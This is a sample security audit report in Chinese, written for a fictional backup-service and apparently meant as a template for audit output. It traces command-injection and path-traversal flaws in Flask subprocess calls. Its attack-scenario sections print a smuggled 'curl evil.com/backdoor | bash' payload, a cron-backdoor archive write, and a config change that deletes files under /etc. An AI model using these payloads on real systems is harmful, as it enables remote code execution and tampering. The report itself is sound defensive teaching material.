# 安全审计报告 — 完整示例

以下是一个虚构项目的审计报告示例，展示期望的输出质量和详细程度。

---

# 安全审计报告

**项目：** backup-service
**日期：** 2025-01-15
**范围：** /opt/backup-service/src/
**语言：** Python、Shell

## 概述

对 backup-service 项目进行外部脚本执行路径安全审计，覆盖 Python 和 Shell 两种语言。共发现 5 个 sink 点，其中 2 个高风险、1 个中风险、2 个低风险。

高风险问题集中在用户可控的文件路径未经消毒直接传入 shell 命令，可导致命令注入和路径穿越。

| 严重程度 | 数量 |
|----------|------|
| 高       | 2    |
| 中       | 1    |
| 低       | 2    |

## 发现

### F-001 备份路径命令注入

**严重程度：** 高
**安全问题类别：** 命令注入
**文件：** `src/backup.py:42`
**Sink 类型：** subprocess.run(shell=True)
**参数来源：** 外部输入
**参数追溯路径：** `subprocess.run(cmd, shell=True)` ← `cmd = f"tar czf {output} {target}"` ← `target = request.json["path"]` ← HTTP POST /api/backup

**代码：**
```python
@app.route("/api/backup", methods=["POST"])
def create_backup():
    target = request.json["path"]
    output = f"/backups/{uuid4()}.tar.gz"
    cmd = f"tar czf {output} {target}"
    subprocess.run(cmd, shell=True, check=True)
    return {"output": output}
```

**完整分析过程：**
1. **Sink 点发现：** grep 匹配 `subprocess.run` at backup.py:42
2. **上下文读取：** 函数 `create_backup()` 接收 HTTP POST 请求，从 JSON body 读取 `path` 字段
3. **参数溯源：** `target` 直接来自 `request.json["path"]`，确认为外部输入（HTTP 请求参数），无中间过滤
4. **命令解析：** `cmd = f"tar czf {output} {target}"`，`target` 直接插值到命令字符串中，无引号包裹
5. **cmd-*.md 比对：** 加载 `cmd-tar.md`，匹配"命令注入 — 参数注入"模式：变量未加引号展开，且 `shell=True` 使命令经过 `/bin/sh -c` 解释
6. **消毒检测：** 加载 `patterns-sanitization.md`，`target` 从输入到使用无任何消毒操作
7. **最终判定：** 高风险 — 命令注入。攻击者可通过构造 `path` 参数注入任意 shell 命令
8. **污点传播链：** 不涉及跨脚本传播，跳过

**描述：**
HTTP API `/api/backup` 接收用户提供的文件路径，直接拼接到 `tar` 命令中并通过 `shell=True` 执行。由于 `shell=True` 使命令经过 shell 解释，攻击者可在 `path` 参数中注入 shell 元字符执行任意命令。

**攻击场景：**
```json
POST /api/backup
{"path": "/data; curl evil.com/backdoor | bash; echo "}
```
实际执行：`tar czf /backups/xxx.tar.gz /data; curl evil.com/backdoor | bash; echo`

---

### F-002 恢复路径穿越

**严重程度：** 高
**安全问题类别：** 跨目录解压
**文件：** `src/restore.py:28`
**Sink 类型：** subprocess.run()
**参数来源：** 外部输入
**参数追溯路径：** `subprocess.run(["tar", "xf", archive, "-C", dest])` ← `dest = request.args["dir"]` ← HTTP GET /api/restore?dir=

**代码：**
```python
@app.route("/api/restore")
def restore_backup():
    archive = request.args["file"]
    dest = request.args["dir"]
    subprocess.run(["tar", "xf", archive, "-C", dest], check=True)
    return {"status": "ok"}
```

**完整分析过程：**
1. **Sink 点发现：** grep 匹配 `subprocess.run` at restore.py:28
2. **上下文读取：** 函数 `restore_backup()` 从 URL 查询参数读取 `file` 和 `dir`
3. **参数溯源：** `archive` 和 `dest` 均来自 HTTP 查询参数，确认为外部输入
4. **命令解析：** 参数以数组形式传递（不经过 shell），但 `tar xf` 的 `-C` 目标目录和归档文件均可控
5. **cmd-*.md 比对：** 加载 `cmd-tar.md`，匹配"跨目录解压 — 路径穿越"：`-C` 目标目录用户可控，且归档文件用户可控（可包含 `../` 路径或绝对路径）
6. **消毒检测：** 无路径规范化、无前缀验证、无 `--no-absolute-names` 选项
7. **最终判定：** 高风险 — 跨目录解压 + 操作任意文件
8. **污点传播链：** 不涉及跨脚本传播，跳过

**描述：**
`archive` 参数可控意味着攻击者可上传包含 `../../etc/cron.d/backdoor` 路径的恶意归档；`dest` 参数可控意味着可直接指定解压到 `/`。两者结合可实现任意文件写入。

**攻击场景：**
```
GET /api/restore?file=/tmp/evil.tar&dir=/
# evil.tar 包含: ../../etc/cron.d/backdoor → 写入定时任务
```

---

### F-003 日志清理脚本参数注入

**严重程度：** 中
**安全问题类别：** 命令注入
**文件：** `src/cleanup.py:15`
**Sink 类型：** subprocess.run()
**参数来源：** 外部输入
**参数追溯路径：** `subprocess.run(["bash", "scripts/cleanup.sh", log_dir])` ← `log_dir = config["log_dir"]` ← 配置文件

**代码：**
```python
def cleanup_logs():
    config = yaml.safe_load(open("config.yml"))
    log_dir = config["log_dir"]
    subprocess.run(["bash", "scripts/cleanup.sh", log_dir], check=True)
```

**完整分析过程：**
1. **Sink 点发现：** grep 匹配 `subprocess.run` at cleanup.py:15
2. **上下文读取：** 从 YAML 配置文件读取 `log_dir`，传给 `cleanup.sh` 脚本
3. **参数溯源：** `log_dir` 来自配置文件，非直接 HTTP 输入，但如果配置文件可被修改则可控。标为"不确定，需人工确认"
4. **命令解析：** 参数以数组传递，但第一个参数是 `bash`，会启动 shell 解释器执行脚本
5. **脚本审计：** 读取 `scripts/cleanup.sh`，发现 `find "$1" -name "*.log" -mtime +30 -delete`，`$1` 直接传入 `find` 命令
6. **cmd-*.md 比对：** 加载 `cmd-file-ops.md`，`find` 的 `-name` 参数虽为硬编码 `*.log`，但 `$1`（搜索路径）可控
7. **消毒检测：** 无路径验证
8. **最终判定：** 中风险 — 需确认配置文件是否可被外部修改

**描述：**
如果攻击者能修改 `config.yml` 中的 `log_dir` 值（如通过其他漏洞写入配置文件），可控制 `find` 命令的搜索路径，遍历任意目录。

**攻击场景：**
```yaml
# config.yml 被篡改为:
log_dir: "/etc"
# find /etc -name "*.log" -mtime +30 -delete → 删除 /etc 下的日志文件
```

---

## 附录：Sink 点清单

| # | 文件 | 行号 | Sink 函数 | 风险等级 | 参数来源 | 备注 |
|---|------|------|-----------|----------|----------|------|
| 1 | src/backup.py | 42 | subprocess.run | 高 | 外部输入 | shell=True，路径直接拼接 |
| 2 | src/restore.py | 28 | subprocess.run | 高 | 外部输入 | tar -C 目标目录可控 |
| 3 | src/cleanup.py | 15 | subprocess.run | 中 | 不确定 | 配置文件来源，需确认是否可篡改 |
| 4 | src/health.py | 8 | subprocess.run | 低 | 内部常量 | `subprocess.run(["echo", "ok"])` 硬编码 |
| 5 | src/version.py | 12 | subprocess.run | 低 | 内部常量 | `subprocess.run(["git", "rev-parse", "HEAD"])` 硬编码 |

## 反思与自检

### 审计覆盖范围
- 检测到的语言：Python、Shell
- 扫描的文件数：23
- 发现的 Sink 点总数：5（高 2 / 中 1 / 低 2）
- 进入深度审计的 Sink 点数：3
- 跨脚本追踪达到最大深度的数量：0
- cmd-*.md 未覆盖的命令：无

### 可能的误报
| # | 发现编号 | 文件:行号 | 误报理由 |
|---|---------|-----------|---------|
| 1 | F-003 | src/cleanup.py:15 | config.yml 可能仅由运维人员手动编辑，不可被外部篡改 |

### 需人工确认清单
| # | 发现编号 | 文件:行号 | 确认原因 |
|---|---------|-----------|---------|
| 1 | F-003 | src/cleanup.py:15 | config.yml 是否可被外部修改（如通过管理界面或文件上传漏洞） |

### 审计局限性
- 仅审计了 src/ 目录，未覆盖 tests/ 目录中的测试代码
- 未检查 config.yml 的访问权限和修改入口
